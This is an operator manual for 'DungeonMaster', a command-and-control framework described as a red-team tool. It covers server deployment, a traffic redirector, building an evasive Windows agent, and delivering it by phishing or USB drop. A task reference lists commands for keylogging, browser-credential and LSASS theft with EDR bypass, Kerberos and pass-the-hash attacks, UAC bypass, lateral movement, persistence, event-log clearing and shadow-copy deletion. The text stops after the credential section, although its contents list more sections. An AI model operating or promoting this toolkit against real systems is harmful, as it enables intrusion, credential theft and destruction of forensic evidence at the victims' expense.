# DungeonMaster C2 Framework — User Manual

**Version:** 1.0
**Last updated:** 2026-07-26
**Repository:** github.com/BroJustLeaveMeAlone/DungeonMaster-C2

---

## Table of Contents

1. [Overview & Architecture](#1-overview--architecture)
2. [Deployment](#2-deployment)
3. [First Engagement Walkthrough](#3-first-engagement-walkthrough)
4. [UI Reference](#4-ui-reference)
5. [Agent Configuration Reference](#5-agent-configuration-reference)
6. [Task Types Reference](#6-task-types-reference)
7. [Evidence & Artifacts](#7-evidence--artifacts)
8. [OPSEC Notes](#8-opsec-notes)
9. [Troubleshooting](#9-troubleshooting)
10. [Roadmap](#10-roadmap)

---

## 1. Overview & Architecture

DungeonMaster is a modular Command & Control framework designed for authorized red team engagements. It separates operator infrastructure (server, UI, storage) from agent execution, with all configuration baked into the agent binary at compile time so no configuration files are written to disk on the target.

### Core concepts

| Concept | What it is |
|---|---|
| Campaign | Engagement container — holds client name, objective, scope. All sessions and evidence bucket under a campaign. |
| Listener | A host:port binding the server opens for agent callbacks. Currently HTTPS only. |
| Build | A compiled agent artifact. Config is frozen at build time. Output is an `.exe` stored in MinIO with a 24-hour presigned download URL. |
| Session | A live or historical agent registration. Created automatically on first check-in. Carries the full host fingerprint. |
| Task | A command queued on the server, fetched by the agent on its next poll. |
| Evidence | Every task result stored in MinIO at `evidence/{session_id}/{task_id}.bin`. |

### Architecture diagram

```
  OPERATOR BROWSER
       |
       | HTTPS :443
       v
  +-----------+
  |  Nginx UI |  (React SPA, served from :80 inside container, exposed :3000)
  |  proxy    |  /api/* -> server:8080
  +-----+-----+
        |
        | HTTP :8080
        v
  +--------------------+        +----------+
  |  Go Team Server    |------> | Postgres |  (TimescaleDB, :5432)
  |  REST API          |        | (schema) |
  |  SSE event bus     |        +----------+
  |  gRPC :50051       |
  |  Build service     |------> Docker socket (DinD builds)
  +--------------------+
        |                       +----------+
        +---------------------->|  Redis   |  (pub/sub for SSE bus, :6379)
        |                       +----------+
        |                       +----------+
        +---------------------->|  MinIO   |  (artifacts + evidence, :9000/:9001)
        |                       +----------+
        | TLS :4443  <-- agent callbacks
        v
  +--------------------+
  | C2 Listener        |  (separate port, TLS 1.3 only)
  | POST /r  register  |
  | GET  /c  poll      |
  | POST /c  output    |
  +--------------------+

  ~~~~ network boundary ~~~~

  REDIRECTOR (optional VPS)
  Nginx — passes /r and /c only; drops all other traffic

  TARGET HOST
  +------------------+
  |  dm-agent.exe    |
  |  (Rust, windows) |
  |  evasion checks  |
  |  fingerprint     |
  |  HTTPS poll loop |
  +------------------+
```

### Port summary

| Port | Service | Exposed to |
|---|---|---|
| 3000 | UI (Nginx → React SPA) | Operator browser |
| 8080 | REST API (direct, no proxy) | Operator tooling / curl |
| 4443 | C2 listener (TLS 1.3, agent callbacks) | Agents / redirector |
| 5432 | PostgreSQL | Internal only |
| 6379 | Redis | Internal only |
| 9000 | MinIO S3 API | Internal + operator (presigned URLs) |
| 9001 | MinIO web console | Operator |
| 50051 | gRPC | Internal (reserved, not yet used by UI) |

---

## 2. Deployment

### Prerequisites

- Docker Engine 24+ with Compose v2
- Docker socket accessible (the build service runs Docker-in-Docker via socket mount)
- For Windows-targeting agents: no extra toolchain needed — cross-compilation runs inside the build container (`rust:1.86-alpine` + `mingw-w64-gcc`)

### First-boot

**1. Clone and enter the project directory.**

```
git clone https://github.com/BroJustLeaveMeAlone/DungeonMaster-C2.git DungeonMaster
cd DungeonMaster
```

**2. Create `.env` from the example.**

```
cp .env.example .env
```

Edit `.env` and set at minimum:

```
DM_JWT_SECRET=<output of: openssl rand -hex 32>
```

All other defaults work for local dev. For production, also change the Postgres/Redis/MinIO credentials and set `DM_MINIO_PUBLIC_ADDR` to the operator-accessible hostname.

**3. Start the stack.**

```
docker compose up -d
```

Docker will build the server, UI, and AI containers on first run (~2-3 minutes). Subsequent starts are fast.

**4. Verify health.**

```
docker compose ps
```

All six containers should show `healthy` or `running`:
- `postgres` — TimescaleDB
- `redis` — session bus
- `minio` — artifact/evidence store
- `server` — Go team server
- `ttp-ranker` — Python TTP engine (optional, can be ignored if no API key)
- `ui` — React UI behind Nginx

**5. Access the UI.**

Navigate to `http://localhost:3000`. Log in with the operator credentials you set via `dm-seed` (see below).

TOTP is disabled in development. Do not expose this instance to the internet without enabling TOTP and changing credentials first.

### Default credentials summary

| Service | URL | Username | Password |
|---|---|---|---|
| Web UI / API | http://localhost:3000 | admin | set via `dm-seed` |
| MinIO console | http://localhost:9001 | `DM_MINIO_ACCESS_KEY` | `DM_MINIO_SECRET_KEY` |
| PostgreSQL | localhost:5432 / db: dm | `DM_POSTGRES_USER` | `DM_POSTGRES_PASSWORD` |
| Redis | localhost:6379 | (none) | `DM_REDIS_PASSWORD` |

### Changing the default operator password

Use the `dm-seed` utility (runs against the live database):

```
docker compose exec server /dm-seed -username admin -password 'NewStr0ng!' -role admin
```

This upserts the operator record. The TOTP secret is regenerated — scan the new QR code into your authenticator if you later enable TOTP.

### Adding additional operators

```
docker compose exec server /dm-seed -username alice -password 'AlicePass1!' -role operator
```

Roles: `operator` (standard access), `admin` (full access including operator management). Role enforcement is implemented at the API layer.

### TLS certificates

The stack ships with a self-signed 10-year certificate in `certs/server.crt` / `certs/server.key`. The C2 listener (`server` container, port 4443) uses this cert. Development agents are built with `DM_TLS_SKIP_VERIFY=true` to accept it.

For production:
- Replace `certs/server.crt` and `certs/server.key` with a valid certificate before deploying.
- Build agents with `DM_TLS_SKIP_VERIFY=false` (the default) and, optionally, pin the certificate SHA256 in the agent build config (planned feature).

### Redirector setup

A standalone Nginx redirector config lives at `redirector/nginx.conf`. Deploy it on a disposable VPS that acts as a traffic relay. The redirector passes only `/r` (registration) and `/c` (poll/output) to the team server, returning a plain 404 for all other paths.

1. Copy `redirector/nginx.conf` to the VPS.
2. Provision a TLS cert for the redirector's hostname (agents will connect to this address).
3. Set the `upstream teamserver` block to point at your team server's IP:4443.
4. In agent builds, set `DM_C2_HOST` to the redirector's hostname, not the team server's IP.

```nginx
upstream teamserver {
    server <TEAMSERVER_IP>:4443;
}
```

### Stopping and data persistence

```
docker compose down          # stop, keep volumes
docker compose down -v       # stop and destroy all data
```

Volumes: `postgres_data`, `redis_data`, `minio_data`, `ai_models`, `build_artifacts`. Evidence and artifacts in MinIO are in `minio_data`.

---

## 3. First Engagement Walkthrough

This section walks through a complete engagement from a clean server to an interactive session.

### Step 1 — Create a campaign

Navigate to `http://localhost:3000`, log in, and click on the dashboard. Currently there is no campaign creation form in the UI — create the campaign via the API directly, or use the campaign creation UI if it has been added to your build.

**Via API (curl):**

First, get an access token:

```
curl -s -X POST http://localhost:8080/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"<your-password>"}' | jq .
```

Copy the `access_token` from the response. Then create the campaign:

```
curl -s -X POST http://localhost:8080/api/v1/campaigns \
  -H 'Authorization: Bearer <ACCESS_TOKEN>' \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "Op Iron Fox",
    "client_name": "Acme Corp (Lab)",
    "objective": "Full domain compromise simulation",
    "scope_cidrs": ["10.10.10.0/24"],
    "scope_domains": ["corp.local"]
  }' | jq .
```

Note the `id` field returned — this is your `CAMPAIGN_ID`. You need it when building the agent.

### Step 2 — Verify a listener exists

On first boot, the server seeds a default listener at `0.0.0.0:4443` named "Default HTTPS C2". Verify:

```
curl -s http://localhost:8080/api/v1/listeners \
  -H 'Authorization: Bearer <ACCESS_TOKEN>' | jq .
```

If the list is empty (which should not happen on a fresh start), create one:

```
curl -s -X POST http://localhost:8080/api/v1/listeners \
  -H 'Authorization: Bearer <ACCESS_TOKEN>' \
  -H 'Content-Type: application/json' \
  -d '{"name":"Default HTTPS C2","bind_host":"0.0.0.0","bind_port":4443,"type":"https"}' | jq .
```

Note the listener `id` for the build step.

### Step 3 — Build an agent

Navigate to `http://localhost:3000/builds` and click "Payload Builder".

Fill in the form:

| Field | Value for this example |
|---|---|
| Campaign | Op Iron Fox |
| Listener | Default HTTPS C2 |
| Target OS | Windows |
| Arch | x64 |
| Sleep (sec) | 30 |
| Jitter (%) | 20 |
| Ephemeral | checked (no persistence) |

Click **Build Payload**. The UI displays a build record with status `queued`, which transitions to `building` within seconds. The build runs Docker-in-Docker and takes approximately 80 seconds on first run (Rust compilation with LTO). Subsequent builds are faster if the Docker layer cache is warm.

When the status becomes `complete`, a **Download artifact** link appears. This is a presigned MinIO URL valid for 24 hours.

You can also poll build status via the API:

```
curl -s http://localhost:8080/api/v1/builds/<BUILD_ID> \
  -H 'Authorization: Bearer <ACCESS_TOKEN>' | jq '{status,artifact_url}'
```

### Step 4 — Deploy the agent

Transfer `dm-agent.exe` to the target host using your preferred delivery method (phishing, USB drop, existing foothold, etc.).

Execute on the target:

```
.\dm-agent.exe
```

The binary has no console window in release builds (`#![windows_subsystem = "windows"]`). It will silently perform evasion checks, fingerprint the host, and call home. If evasion checks pass, a new session appears on the server within one sleep interval (default 30 seconds).

For development/testing on the local Windows host with the Docker stack running:

```powershell
Start-Process -FilePath .\dm-agent.exe -WindowStyle Hidden
```

The agent connects to `host.docker.internal:4443` (resolved inside Docker) when built with the default dev config. If running on the actual Windows host, point `DM_C2_HOST` to `localhost` or `127.0.0.1`.

### Step 5 — Observe the session

The Dashboard at `/` auto-refreshes every 10 seconds. The session appears in the **Live Sessions** table with the hostname, username, OS, elevation status, and last-seen timestamp.

Click **interact →** to open the session console, or navigate through a campaign to reach the same page scoped to that engagement.

### Step 6 — Run tasks

In the session console, type a command in the input bar and press Enter:

```
whoami
```

The command is dispatched as a `shell` task. The UI polls for output every 2 seconds for up to 2 minutes. Results display in the xterm.js terminal window. Stdout and stderr are both captured and concatenated.

Example commands verified working:

```
whoami
ipconfig
hostname
net user
systeminfo
```

### Step 7 — Review evidence

Every completed task output is stored in MinIO at `evidence/{session_id}/{task_id}.bin`. Access via:

- MinIO console: `http://localhost:9001` — browse the `evidence` bucket
- Presigned URL: generated at task completion (stored in the `evidence` table)
- Direct MinIO API: `http://localhost:9000/evidence/{session_id}/{task_id}.bin` (requires MinIO auth)

### Step 8 — Revoke the session

When operations are complete, click **revoke** in the session console header bar. The agent receives a `kill: true` signal on its next poll, calls `evasion::cleanup()`, and exits cleanly. The session remains in the database as `is_revoked = true` for the record.

---

## 4. UI Reference

### 4.1 Login page — `/login`

Standard username/password form. On success, the server returns an `access_token` (short-lived JWT) and a `refresh_token` (longer-lived). Both are stored in `localStorage`. The refresh token is used to silently renew the access token.

When TOTP is enabled (production), a third field for the 6-digit TOTP code appears. Currently commented out on the server side (`gateway.go` line ~91).

**Error cases:**
- `invalid credentials` — wrong username or password. The server performs a constant-time dummy bcrypt comparison to resist timing-based username enumeration.
- Network errors — check that the server is running on port 3000/8080.

### 4.2 Dashboard — `/`

Entry point after login. Two sections:

**Active Campaigns**

Cards showing all campaigns with `is_active = true`. Click a card to navigate to the campaign detail page. If the list is empty, create a campaign via the API.

**Live Sessions** (auto-refreshes every 10 seconds)

All sessions where `is_alive = true` and `is_revoked = false`, across all campaigns.

| Column | Meaning |
|---|---|
| Host | `hostname` reported by the agent |
| User | `username` reported by the agent |
| OS | OS name (e.g., `windows`) |
| Elevated | `SYSTEM` in red if `is_elevated = true`; dash otherwise |
| Last Seen | Time of last heartbeat |
| (link) | "interact →" opens the session console |

A session is marked alive when it heartbeats; it flips to dead if it misses 5× its configured sleep interval (checked every 60 seconds by the server's stale-session ticker).

### 4.3 Campaign page — `/campaigns/:id`

Shows a single campaign with its session list and a live event feed.

**Header bar:** Campaign name, client name, and objective. Back link to dashboard.

**Session list** (left panel, auto-refreshes every 15 seconds):

Each session row shows:
- Dot indicator: green = alive, gray = dead/stale
- Hostname (bold)
- Username
- `ELEV` badge (red border) if elevated
- OS name
- Last-seen time

Click any row to open that session's console.

**Event feed** (right panel, 320px fixed width):

A real-time SSE stream from `GET /api/v1/events?campaign_id=<id>`. Events are displayed newest-at-bottom, capped at 300 entries.

| Event type | Color | When fired |
|---|---|---|
| `SESSION_CHECKIN` | green | Agent first registers or re-registers |
| `SESSION_REVOKED` | red | Operator revokes a session |
| `TASK_QUEUED` | blue | Operator queues a task |
| `TASK_OUTPUT` | light gray | Agent submits task output |
| `EVASION_DETECTED` | yellow | Agent reports an evasion trigger mid-run |
| `BUILD_COMPLETE` | purple | An agent build finishes |
| `OPERATOR_JOINED` | dark gray | Another operator opens this campaign page |
| `OPERATOR_LEFT` | dark gray | Operator closes or navigates away |

Each event line shows: timestamp / event type / first 8 chars of the session UUID (when applicable).

### 4.4 Session page — `/campaigns/:id/sessions/:sid`

Full session detail and interactive console.

**Top bar:**

| Element | Meaning |
|---|---|
| Green/gray dot | Live (`is_alive`) or dead |
| Hostname | Bold |
| `username@domain` | Domain is shown only if non-empty |
| `ELEVATED` badge | Token has admin/SYSTEM privileges |
| `REVOKED` badge | Session has been revoked; agent will exit on next poll |
| OS / arch / version | e.g., `windows x86_64 10.0.19045` |
| Channel · sleep · jitter | Active channel type, current sleep interval and jitter percentage |
| `revoke` button | Triggers a server-side kill signal |

**EDR/AV warning bar:** If the session's `edr_detected` or `av_detected` arrays are non-empty (populated during agent fingerprinting), a yellow bar below the top bar lists the detected process names. This does not automatically suppress operations — it is informational.

**Console (xterm.js terminal):**

The terminal displays a session header on first load, then a scrollable output area. The input bar at the bottom accepts commands. Press Enter to dispatch.

Commands are sent as `shell` tasks. The UI polls the task status endpoint every 2 seconds, up to 120 seconds (60 attempts). If the agent does not return output within 2 minutes, the console prints a timeout message. The task remains in the database and will be completed when the agent next polls.

The console does not support interactive commands (SSH, PowerShell remoting, etc.) that require bidirectional input streams. Use single-shot commands only.

**Revoke flow:** Clicking revoke prompts a confirmation dialog. On confirm, `POST /api/v1/sessions/{id}/revoke` is called with reason `operator-revoked`. The agent receives `kill: true` on its next poll and calls `evasion::cleanup()` before exiting.

### 4.5 Builds page — `/builds`

**Payload Builder form** (left):

| Field | Valid values | Notes |
|---|---|---|
| Campaign | Dropdown (active campaigns) | Required. Sets `DM_CAMPAIGN_ID` in the binary. |
| Listener | Dropdown (active listeners) | Optional. Defaults to `host.docker.internal:4443` if not selected. |
| Target OS | windows / linux / macOS | Only `windows` produces a working binary currently. |
| Arch | x64 / x86 / ARM64 | Only `x64` is supported by the current cross-compile toolchain. |
| Sleep (sec) | 1–3600 | Default 30. Sets the base polling interval. |
| Jitter (%) | 0–50 | Default 20. Applied as ± random offset on each sleep. |
| Process Hollowing | checkbox | Feature flag `process-hollow` — stub only, not yet implemented. |
| ETW Patch | checkbox | Feature flag `etw-patch` — stub only. |
| AMSI Patch | checkbox | Feature flag `amsi-patch` — stub only. |
| Ephemeral | checkbox (default on) | No persistence installed — agent runs in-memory only. |

Build status values:

| Status | Color | Meaning |
|---|---|---|
| `queued` | yellow | Build record created, Docker job not yet started |
| `building` | yellow | Docker build in progress |
| `complete` | green | Binary ready, presigned download URL available |
| `failed` | red | Docker build or MinIO upload failed; check server logs |

**Build history list** shows the 50 most recent builds ordered by creation time. Each entry shows build ID, status, target OS/arch, creation time, and a download link when complete.

---

## 5. Agent Configuration Reference

All configuration is baked into the binary at compile time via Rust's build script (`agent/build.rs`). There are no runtime config files, registry keys, or environment variables read on the target host.

### Build arguments

These are passed as `--build-arg` to Docker (or as environment variables when building manually). The UI form sets all of them except `DM_C2_PATH_POLL` and `DM_C2_PATH_REG`, which are currently fixed.

| Variable | Default | Description |
|---|---|---|
| `DM_C2_HOST` | `127.0.0.1` | Hostname or IP the agent connects to. Set to redirector hostname in production. |
| `DM_C2_PORT` | `4443` | TCP port of the C2 listener. |
| `DM_C2_PATH_POLL` | `/c` | URL path for agent polling (GET) and output submission (POST). |
| `DM_C2_PATH_REG` | `/r` | URL path for initial registration (POST). |
| `DM_CAMPAIGN_ID` | `00000000-0000-0000-0000-000000000000` | UUID of the campaign this agent belongs to. Zero UUID means no campaign association. |
| `DM_BUILD_UUID` | `00000000-0000-0000-0000-000000000000` | UUID assigned by the build service. Used to correlate the session with its build record. |
| `DM_SLEEP_SECS` | `30` | Base sleep interval in seconds between polls. Server can override dynamically. |
| `DM_JITTER_PCT` | `20` | Jitter percentage (0–50). Each sleep duration is adjusted by a random offset of ±(sleep × jitter/100). |
| `DM_TLS_SKIP_VERIFY` | `false` | Set to `true` to accept any TLS certificate (dev only — allows self-signed certs). Never use in production. |
| `DM_NO_EVASION` | `false` | Set to `true` to disable all sandbox and analysis tool checks. Dev/testing only. |

### Sleep calculation

Actual sleep = `DM_SLEEP_SECS + random_offset`, where `random_offset` is in the range `[-(sleep * jitter/100), +(sleep * jitter/100)]`, clamped to a minimum of 1 second.

Example: `DM_SLEEP_SECS=30`, `DM_JITTER_PCT=20` → sleep randomly between 24 and 36 seconds each cycle.

### Evasion feature flags (Cargo features)

These are defined in `agent/Cargo.toml` and control optional post-exploitation capabilities. Stubs exist in the code; implementation is planned for future phases.

| Feature | Status | Description |
|---|---|---|
| `process-hollow` | Stub | Replace a legitimate process image with agent code at launch |
| `etw-patch` | Stub | Patch ETW provider in-memory to suppress telemetry |
| `amsi-patch` | Stub | Patch AMSI in the current process to bypass PowerShell script scanning |
| `channel-https` | Implemented | Default HTTPS callback channel |
| `channel-dns` | Stub | DNS-over-HTTPS covert channel |
| `channel-smb` | Stub | SMB named-pipe channel for internal pivoting |

### Release profile

The agent is compiled with these Cargo release profile settings, which affect binary size and detectability:

```toml
[profile.release]
opt-level     = "z"    # optimize for size, not speed
lto           = true   # link-time optimization
codegen-units = 1      # single codegen unit (required for LTO)
strip         = true   # strip all debug symbols from the binary
panic         = "abort" # no unwinding — smaller binary, no stack trace on panic
```

---

## 6. Task Types Reference

Tasks are queued by the operator and fetched by the agent on its next poll. The agent matches the `type` field and dispatches to the appropriate handler. Up to 10 queued tasks are dispatched per poll cycle.

### Task lifecycle

```
queued  →  sent  →  complete
                  →  failed
       →  cancelled  (operator cancels before agent fetches)
```

### Wire format

All task args are base64-encoded JSON. The UI handles encoding automatically. For direct API calls:

```powershell
# PowerShell
$args = @{ method = "ls"; path = "C:\Users" } | ConvertTo-Json -Compress
$argsB64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args))
$body = @{ session_id = "<SID>"; type = "file"; args = $argsB64 } | ConvertTo-Json
Invoke-RestMethod -Uri http://localhost:8080/api/v1/tasks -Method POST `
  -Headers @{Authorization="Bearer $token"} -ContentType "application/json" -Body $body
```

The `args` field is a **base64-encoded JSON object**. The `method` sub-field selects the operation within each task type.

### Quick reference

| Type | Methods |
|---|---|
| `shell` | *(no method field)* — raw command |
| `file` | `ls` `read` `write` `rm` `mkdir` `mv` `cp` `info` |
| `enum` | `processes` `services` `tasks` `sessions` `shares` `users` `groups` `localadmins` `computer` `domain` `routes` `netdiscovery` `bloodhound` `acl` `unconstrained-deleg` |
| `collect` | `clipboard` `dpapi` `vault` `wifi` `browser-creds` `browser-history` `file-search` `screen-record` `keylog-start` `keylog-stop` `keylog-dump` `ssh-keys` `certs` `email` |
| `priv` | `sam-dump` `token-steal` `token-make` `potato` `pipe-impersonate` `uac-fodhelper` `uac-eventvwr` `uac-sdclt` `unquoted-paths` `dll-hijack` `always-install-elevated` `shadow-creds` `rbcd` `adcs` `acl-abuse` `s4u` |
| `lateral` | `smb-psexec` `wmi` `winrm` `dcom` `rdp-pth` `adidns` |
| `persist` | `reg` `reg-rm` `task` `svc` `svc-rm` `startup` `com` `wmi` |
| `antifor` | `timestomp` `indicator-rm` `eventlog-clear` `eventlog-del` `shadow-delete` |
| `cred` | `lsass` `lsass-pss` `lsass-syscall` `kerberoast` `asrep-roast` `ptt` `pth` `opth` `dcsync` `golden-ticket` `silver-ticket` `diamond-ticket` |
| `inject` | `classic` `apc` `classic-spawn` `hollow` `hijack` `stomp` |
| `sleep` | *(no method)* — update beacon interval |
| `kill` | *(no method)* — terminate agent |
| `screenshot` | *(no method)* — capture desktop |
| `upload` | *(no method)* — read file from target |
| `download` | *(no method)* — write file to target |
| `relay_start` / `relay_stop` | SMB relay chain |

---

### `shell`

Execute a command via `cmd /C`.

**Args:** `{"cmd": "<command string>"}`

**Output:** Combined stdout + stderr. No PTY — interactive programs don't work. Exit code not surfaced separately.

---

### `sleep`

Update the agent's beacon interval.

**Args:** `{"seconds": N}`

**Output:** `"sleep updated"`

To change sleep via API: `PATCH /api/v1/sessions/{id}/sleep` with `{"sleep_seconds": N, "jitter_pct": N}`.

---

### `kill`

Terminate the agent. No args. Agent exits after sending the response.

---

### `screenshot`

Capture the desktop. No args. **Output:** Raw BMP bytes.

---

### `upload`

Read a file from the target.

**Args:** `{"path": "C:\\path\\to\\file"}`

**Output:** Raw file bytes, stored as evidence in MinIO.

---

### `download`

Write a file to the target.

**Args:** `{"path": "C:\\dest\\path.exe", "data": "<base64 file bytes>"}`

**Output:** `"written N bytes to path"`

---

### `file` — File Manager

| Method | Required args | Optional args | Output |
|---|---|---|---|
| `ls` | — | `path` (default `.`) | One entry per line: name padded to 50 chars + `<DIR>` or size |
| `read` | `path` | — | Base64-encoded file bytes |
| `write` | `path`, `data` (base64) | — | `"written N bytes to path"` |
| `rm` | `path` | — | `"removed {path}"` |
| `mkdir` | `path` | — | `"created {path}"` |
| `mv` | `src`, `dst` | — | `"moved src -> dst"` |
| `cp` | `src`, `dst` | — | `"copied N bytes: src -> dst"` |
| `info` | `path` | — | Multi-line: path, type, size, readonly |

---

### `enum` — Enumeration

#### Host enumeration

| Method | Required args | Optional args | Output |
|---|---|---|---|
| `processes` | — | — | TSV: `PID\tPPID\tThreads\tName` |
| `services` | — | — | TSV: `Name\tDisplayName\tStatus\tPID` |
| `tasks` | — | — | One scheduled task path per line |
| `sessions` | — | — | TSV: `Client\tUser\tTime(s)\tIdleTime(s)` |
| `shares` | — | `host` (default: localhost) | TSV: `Share\tType\tRemark` |
| `users` | — | `host` | One username per line |
| `groups` | — | — | One group name per line |
| `localadmins` | — | — | One member per line |
| `computer` | — | — | Full host profile: hostname, OS, arch, patches, AV |
| `domain` | — | — | Domain trusts + workstation config |
| `routes` | — | — | TSV: `Dest/Prefix\tNextHop\tIfIndex\tMetric` |
| `netdiscovery` | `target` (CIDR or host) | `ports` (csv, default: common), `timeout_ms` (default: 300) | TSV: `Host\tPort\tStatus` (open only) |

#### AD enumeration (requires domain context)

| Method | Required args | Optional args | Output |
|---|---|---|---|
| `bloodhound` | — | `domain`, `dc`, `user`, `pass` | JSON: users, computers, groups, trusts, GPOs, CAs + stats |
| `acl` | — | `domain`, `dc`, `user`, `pass` | JSON: AD objects with their ACEs and rights |
| `unconstrained-deleg` | — | `domain`, `dc`, `user`, `pass` | JSON: computers and users with unconstrained delegation |

For AD methods, `domain` defaults to `%USERDNSDOMAIN%` and `dc` defaults to the domain FQDN. Pass `user`/`pass` explicitly if the current session doesn't have LDAP access.

---

### `collect` — Collection

| Method | Required args | Optional args | Output |
|---|---|---|---|
| `clipboard` | — | — | Clipboard text (or empty message) |
| `dpapi` | `blob` (base64 DPAPI blob) | — | Decrypted plaintext bytes |
| `vault` | — | — | TSV: `Target\tUsername\tSecret` |
| `wifi` | — | — | `SSID: name\tKey: pass` per profile |
| `browser-creds` | — | `browser` (`chrome`/`edge`/`brave`, default: `chrome`) | TSV: `URL\tUsername\tPassword` |
| `browser-history` | — | `browser`, `limit` (default: 100) | TSV: `URL\tTitle\tVisitCount` |
| `file-search` | — | `path` (default: `C:\Users`), `pattern` (default: `*.txt`), `grep`, `max` (default: 200) | One matching path per line |
| `screen-record` | — | `count` (default: 5), `interval_ms` (default: 3000) | JSON array of base64 BMP strings |
| `keylog-start` | — | — | `"keylog: started"` |
| `keylog-stop` | — | — | `"keylog: stopped"` |
| `keylog-dump` | — | — | Captured keystrokes (cleared after dump) |
| `ssh-keys` | — | — | JSON: ssh_files (path, size, content_b64), putty_sessions |
| `certs` | — | — | JSON: certs from MY/CA/ROOT stores + PFX export |
| `email` | — | — | JSON: PST/OST/NST files (path, size) |

---

### `priv` — Privilege Escalation

#### Local privilege escalation

| Method | Required args | Optional args | Notes |
|---|---|---|---|
| `sam-dump` | — | — | Dumps SAM/SYSTEM/SECURITY hives as base64. Needs SeBackupPrivilege or local admin. |
| `token-steal` | — | `spawn` (exe path) | Steals SYSTEM token. Without `spawn`: impersonates in-place. With `spawn`: launches exe as SYSTEM. |
| `token-make` | `user`, `pass` | `domain` (default `.`) | Creates logon token from explicit creds and impersonates. |
| `potato` | — | `cmd` | RogueWinRM / schtasks DCOM trigger to get SYSTEM impersonation. |
| `pipe-impersonate` | — | — | Opens a named pipe and impersonates the first privileged client. Waits up to 60 seconds. |
| `uac-fodhelper` | `cmd` | — | UAC bypass via ms-settings shell handler. |
| `uac-eventvwr` | `cmd` | — | UAC bypass via mmc application association. |
| `uac-sdclt` | `cmd` | — | UAC bypass via sdclt.exe isolation provider. |
| `unquoted-paths` | — | — | Scans services for unquoted paths with spaces. Reports writable hijack locations. |
| `dll-hijack` | — | — | Finds writable %PATH% dirs and missing DLL targets. |
| `always-install-elevated` | — | — | Checks both HKLM and HKCU AlwaysInstallElevated keys. Reports `[VULNERABLE]` if set. |

#### AD privilege escalation (requires domain context)

| Method | Required args | Optional args | Notes |
|---|---|---|---|
| `shadow-creds` | `target` (sAMAccountName) | `domain`, `dc`, `user`, `pass`, `remove` (bool) | Adds/removes msDS-KeyCredentialLink. Output includes public/private key pair for follow-on auth. |
| `rbcd` | `target`, `attacker_sid` | `domain`, `dc`, `user`, `pass`, `remove` (bool) | Writes msDS-AllowedToActOnBehalfOfOtherIdentity. Use with `priv/s4u` for follow-on exploitation. |
| `adcs` | — | `domain`, `dc`, `user`, `pass` | Enumerates certificate templates for ESC1/2/3/9/10. Returns vulnerable templates with severity ratings. |
| `acl-abuse` | `target` | `action` (`add`/`list`, default `add`), `trustee_sid`, `right` (`write-dacl`/`generic-all`/`dcsync`/etc.), `domain`, `dc`, `user`, `pass` | Appends ACE to target object DACL. Use `list` to view existing ACEs first. |
| `s4u` | — | `domain`, `dc`, `user`, `pass`, `target` | Enumerates constrained delegation (msDS-AllowedToDelegateTo). Identifies S4U2Self / S4U2Proxy abuse paths. |

---

### `lateral` — Lateral Movement

| Method | Required args | Optional args | Notes |
|---|---|---|---|
| `smb-psexec` | `host`, `cmd` | `timeout_s` (default 30), `task_name` | Service-based exec via SCM. Returns command output. Runs as SYSTEM. |
| `wmi` | `host`, `cmd` | `user`, `pass` | Win32_Process.Create via WMI. Fire-and-forget if no output redirect in cmd. |
| `winrm` | `host`, `cmd` | `user`, `pass` | winrs execution. Requires WinRM enabled on target. |
| `dcom` | `host`, `cmd` | `user`, `pass` | DCOM execution (routes through WMI path). Fire-and-forget. |
| `rdp-pth` | `host` | `user`, `domain`, `pass`, `check_only` (bool) | RDP via Restricted Admin mode. Use `check_only=true` to check if the target supports it without connecting. |
| `adidns` | `action` (`add`/`remove`/`list`) | `name`, `ip` (required for add), `zone`, `ttl`, `domain`, `dc`, `user`, `pass` | Manage AD-Integrated DNS records for rogue A records / relay attacks. |

---

### `persist` — Persistence

| Method | Required args | Optional args | Notes |
|---|---|---|---|
| `reg` | `name`, `path` | `hive` (`hkcu`/`hklm`, default `hkcu`) | Adds Run key entry. |
| `reg-rm` | `name` | `hive` (default `hkcu`) | Removes Run key entry. |
| `task` | `name`, `path` | `trigger` (default `ONLOGON`), `user` (default `SYSTEM`) | Creates scheduled task via schtasks. |
| `svc` | `name`, `path` | `display` | Creates and starts a Windows service. |
| `svc-rm` | `name` | — | Stops and deletes a service. |
| `startup` | `src`, `name` | — | Copies file into user startup folder. |
| `com` | `clsid`, `dll` | — | Hijacks COM CLSID InprocServer32/LocalServer32. |
| `wmi` | `name`, `cmd` | — | Creates WMI event subscription for persistence. |

---

### `antifor` — Anti-Forensics

| Method | Required args | Optional args | Notes |
|---|---|---|---|
| `timestomp` | `path` | `created`, `modified`, `accessed` (format: `YYYY-MM-DD HH:MM:SS`), `copy_from` | Modifies NTFS timestamps. Use `copy_from` to clone timestamps from a reference file. |
| `indicator-rm` | `path` | — | Zero-fills then deletes the file. |
| `eventlog-clear` | — | `channel` (default `Security`) | Clears a Windows event log channel. |
| `eventlog-del` | `record_id` | `channel` (default `Security`) | Removes a single event record (clears + reimports all others). |
| `shadow-delete` | — | — | Deletes all VSS shadow copies via vssadmin. |

---

### `cred` — Credential Access

#### LSASS dumps

All three methods require local admin. Output is XOR-encoded MDMP bytes — decode with `output[i] ^= (i & 0xFF)`.

| Method | Notes |
|---|---|
| `lsass` | Direct MiniDumpWriteDump. Highest EDR signal. **Blocked by Windows Defender behavioral detection.** |
| `lsass-pss` | PssCaptureSnapshot API. Lower EDR signal than direct OpenProcess. |
| `lsass-syscall` | Indirect NT syscalls. Bypasses EDR hooks on OpenProcess / ReadProcessMemory. |

#### Kerberos attacks

| Method | Required args | Optional args | Notes |
|---|---|---|---|
| `kerberoast` | — | `domain`, `dc`, `user`, `pass` | Returns TGS tickets for SPN accounts. Crack offline with hashcat mode 13100. |
| `asrep-roast` | — | `domain`, `dc`, `user`, `pass` | Finds pre-auth disabled accounts and returns AS-REP hashes. Crack with hashcat mode 18200. |
| `ptt` | `ticket_b64` (kirbi) | `purge` (bool) | Injects a Kerberos ticket into the current logon session via LsaCallAuthenticationPackage. |
| `pth` | `user`, `pass` | `domain` (default `.`), `cmd` (default `cmd.exe`) | Pass-the-Hash via CreateProcessWithLogonW. Spawns a process using the credentials for network auth. |
| `opth` | `domain`, `user`, `ntlm` (32-char hex) | `aes256_key` (64-char hex), `dc`, `cmd` | Overpass-the-Hash. Sends raw AS-REQ to DC:88 using the NT hash, injects the returned TGT. Optionally runs a command afterward. |
